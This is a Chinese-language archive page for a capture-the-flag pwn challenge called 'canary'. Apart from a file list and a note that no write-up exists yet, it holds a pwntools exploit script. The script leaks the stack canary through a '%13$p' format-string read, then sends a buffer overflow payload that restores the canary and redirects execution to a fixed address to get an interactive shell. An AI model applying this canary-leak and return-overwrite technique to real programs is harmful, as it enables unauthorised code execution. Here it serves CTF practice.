# 知识点

栈

# 题目分析

分类：pwn / 栈。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [canary](canary)
- [exp.py](exp.py)
- [exp_副本.py](exp_%E5%89%AF%E6%9C%AC.py)

尚无可匹配的题解正文，当前保留附件及已有脚本，分析结论待补。

# EXP

- [exp.py](exp.py)
- [exp_副本.py](exp_%E5%89%AF%E6%9C%AC.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import*
p= process('./canary')
# p=remote("127.0.0.1", 30818)
p.sendline(b'%13$p')
p.recvuntil(b'chirps:\n')
canary = int(p.recvline().strip(), 16)   # 直接 int 转换，自动识别 0x 前缀
log.success(f'canary: {hex(canary)}')
p1=b'a'*56
p2=b'b'*8
bin=0x0004011FE
ret=0x00040101A
pad=p1+p64(canary)+p64(0)+p64(ret)+p64(bin)
p.send(pad)
p.interactive()
```
